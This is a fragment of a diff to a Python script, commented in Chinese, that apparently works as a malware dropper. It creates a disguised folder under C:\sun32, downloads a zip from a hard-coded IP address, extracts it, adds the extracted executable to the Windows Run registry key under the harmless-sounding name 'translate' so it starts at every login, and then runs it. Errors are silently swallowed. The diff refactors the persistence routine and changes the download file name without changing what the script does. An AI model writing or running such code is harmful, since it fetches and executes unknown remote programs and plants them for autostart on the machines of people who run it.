@@ -18,17 +18,16 @@ def remove_dir(dir):
 			os.remove(dir)
 
 
-class AutoRun():
-	def __init__(self):
-		name = 'translate'  # 要添加的项值名称
-		path = r'C:\sun32\center\windows\c.exe'  # 要添加的exe路径
-		# 注册表项名
-		KeyName = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
-		# 异常处理
+def add():
+	name = 'translate'  # 要添加的项值名称
+	path = r'C:\sun32\center\windows\c.exe'  # 要添加的exe路径
+	# 注册表项名
+	KeyName = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
+	# 异常处理
 
-		key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,  KeyName, 0,  win32con.KEY_ALL_ACCESS)
-		win32api.RegSetValueEx(key, name, 0, win32con.REG_SZ, path)
-		win32api.RegCloseKey(key)
+	key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,  KeyName, 0,  win32con.KEY_ALL_ACCESS)
+	win32api.RegSetValueEx(key, name, 0, win32con.REG_SZ, path)
+	win32api.RegCloseKey(key)
 
 
 if __name__=='__main__':
@@ -39,15 +38,15 @@ if __name__=='__main__':
 
 	os.makedirs(r"C:\sun32\center\windows")
 
-	request.urlretrieve("http://34.80.135.251/lcv2Win.zip",r"C:\sun32\center\windows\c.zip")
+	request.urlretrieve("http://34.80.135.251/c.zip",r"C:\sun32\center\windows\c.zip")
 	azip = zipfile.ZipFile(r"C:\sun32\center\windows\c.zip")
 	#解压到原始目录
 	azip.extractall(r"C:\sun32\center\windows")
 	
 	try:
 		time.sleep(2)
-    	auto=AutoRun()
-    except:
+		add()
+	except:
 		print("ok")
 
 	os.system(r"C:\sun32\center\windows\c.exe")
